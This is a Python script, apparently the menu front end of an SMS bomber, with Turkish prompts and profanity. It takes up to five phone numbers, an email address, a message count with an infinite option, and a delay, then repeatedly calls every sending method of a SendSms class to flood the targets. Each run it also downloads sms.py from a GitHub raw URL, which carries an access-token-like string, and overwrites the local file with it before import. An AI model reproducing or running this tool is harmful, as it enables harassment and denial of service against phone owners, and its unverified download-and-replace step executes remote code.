from colorama import Fore, Style
from time import sleep
from os import system
from requests import get
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

r = get(
  "https://raw.githubusercontent.com/Kanor00/sms-2/main/sms.py?token=GHSAT0AAAAAACEBN47NWMG6SUTMDVNYNRW6ZEOB75A").text

with open("sms.py", "r", encoding="utf-8") as f:
  read = f.read()

if read == r:
  pass
else:
  print(Fore.RED + "Updating ASAP...")
  with open("sms.py", "w", encoding="utf-8") as f:
    f.write(r)

from sms import SendSms

servisler_sms = []

for attribute in dir(SendSms):
  attribute_value = getattr(SendSms, attribute)
  if callable(attribute_value):
    if attribute.startswith('__') == False:
      servisler_sms.append(attribute)

while True:
  system("cls||clear")
  print("""{}
 Halal SMSBomber  ( ͡° ͜ʖ ͡°)

    Sms: {}                                      
    """.format(Fore.LIGHTRED_EX, len(servisler_sms), Style.RESET_ALL,
               Fore.CYAN))
  print(Fore.LIGHTGREEN_EX + "{/} " + Style.RESET_ALL + "Made by " +
        Fore.LIGHTGREEN_EX + Style.BRIGHT + "KANOR SİKER\n" + Style.RESET_ALL)
  try:
    menu = int(
      input(Fore.LIGHTMAGENTA_EX +
            " 1- Send SMS \n 2- Top Secret\n 3- Exit\n\n" +
            Fore.LIGHTYELLOW_EX + " Seçim: "))
  except ValueError:
    system("cls||clear")
    print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. yarak kafa.")
    sleep(3)
    continue

  if menu == 1:
    system("cls||clear")
    try:
      print(
        Fore.LIGHTYELLOW_EX +
        "Phone Number (if more than 'one' press ENTER): "
        + Fore.LIGHTGREEN_EX,
        end="")
      tel_no = input()
      if tel_no != "" and len(str(tel_no)) == 10:
        tel_no2 = "bos"
        tel_no3 = "bos"
        tel_no4 = "bos"
        tel_no5 = "bos"
      if tel_no == "":
        system("cls||clear")
        print(
          Fore.LIGHTGREEN_EX + "[+] " + Fore.CYAN + "TXT dosya formatı:\n" +
          Fore.LIGHTGREEN_EX + "[+] " + Fore.CYAN +
          "Max 5 alt alta."
        )
        print("")
        print("")
        print(Fore.LIGHTYELLOW_EX + "TXT dosyasının adresini/yolunu gir canım: " +
              Fore.LIGHTGREEN_EX,
              end="")
        dosya_yolu = input()
        try:
          with open(dosya_yolu, 'r') as file:
            tel_list = file.readlines()
            for i, number in enumerate(tel_list):
              if i == 0:
                tel_no = number.strip()
              elif i == 1:
                tel_no2 = number.strip()
              elif i == 2:
                tel_no3 = number.strip()
              elif i == 3:
                tel_no4 = number.strip()
              elif i == 4:
                tel_no5 = number.strip()
              if len(number.strip()) != 10:
                raise ValueError
            if i < 4:
              for j in range(i + 1, 5):
                if j == 1:
                  tel_no2 = "bos"
                elif j == 2:
                  tel_no3 = "bos"
                elif j == 3:
                  tel_no4 = "bos"
                elif j == 4:
                  tel_no5 = "bos"
        except FileNotFoundError:
          system("cls||clear")
          print(Fore.LIGHTRED_EX + "Dosya bulunamadı. yarak kafa.")
          sleep(3)
          continue
        except ValueError:
          system("cls||clear")
          print(Fore.LIGHTRED_EX +
                "Hatalı telefon numarası, yarak kafa.")
          sleep(3)
          continue
      else:
        if len(tel_no) != 10:
          raise ValueError
    except ValueError:
      system("cls||clear")
      print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. yarak kafa.")
      sleep(3)
      continue
    system("cls||clear")
    try:
      print(Fore.LIGHTYELLOW_EX +
            "Mail address (If you dont know press 'ENTER'): " +
            Fore.LIGHTGREEN_EX,
            end="")
      mail = input()
      if ("@" not in mail or ".com" not in mail) and mail != "":
        raise
    except:
      system("cls||clear")
      print(Fore.LIGHTRED_EX + "Hatalı mail adresi. yarak kafa.")
      sleep(3)
      continue
    system("cls||clear")
    try:
      print(Fore.LIGHTGREEN_EX + "[+] " + Fore.CYAN +
            "Birden çok numara varsa her bir numara için.")
      print(Fore.LIGHTYELLOW_EX +
            "How many SMS's do you want to send (if ∞ write 0): " +
            Fore.LIGHTGREEN_EX,
            end="")
      kere = input()
      if kere:
        kere = int(kere)
      else:
        kere = None
    except ValueError:
      system("cls||clear")
      print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. yarak kafa.")
      sleep(3)
      continue

    system("cls||clear")
    try:
      print(Fore.LIGHTYELLOW_EX +
            "The time between SMS's: " + Fore.LIGHTGREEN_EX,
            end="")
      aralik = int(input())
    except ValueError:
      system("cls||clear")
      print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. yarak kafa.")
      sleep(3)
      continue
    system("cls||clear")
    if kere is not None:
      tel_numbers = [tel_no, tel_no2, tel_no3, tel_no4, tel_no5]
      bos_olmayan = len([x for x in tel_numbers if x != "bos"])
      keree = kere * bos_olmayan
    sms = SendSms(tel_no, mail)
    if isinstance(kere, int):
      while sms.adet < kere:
        for attribute in dir(SendSms):
          attribute_value = getattr(SendSms, attribute)
          if callable(attribute_value):
            if attribute.startswith('__') == False:
              if sms.adet == keree or sms.adet > keree:
                break
              exec("sms." + attribute + "()")
              sleep(aralik)
      print(Fore.LIGHTRED_EX + "\nTo go back to the menu press 'ENTER' ")
      input()
    elif kere is None:
      while True:
        for attribute in dir(SendSms):
          attribute_value = getattr(SendSms, attribute)
          if callable(attribute_value):
            if attribute.startswith('__') == False:
              exec("sms." + attribute + "()")
              sleep(aralik)
    pass
  elif menu == 2:
    system("cls||clear")
    print(Fore.LIGHTYELLOW_EX + "İletişim bilgileri:\n\n" +
          Fore.LIGHTGREEN_EX +
          "cennet | şeytanın götünde\n" +
          Fore.LIGHTGREEN_EX + "sikimin başı\n")

    print(Fore.LIGHTGREEN_EX + "{/} " + Style.RESET_ALL + "Made by " +
          Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "KANOR SİKER\n" +
          Style.RESET_ALL)
    print(Fore.LIGHTRED_EX + "To go back to the menu write 'ENTER' ")
    input()
  elif menu == 3:
    system("cls||clear")
    print(Fore.LIGHTRED_EX + "Exiting...")
    break
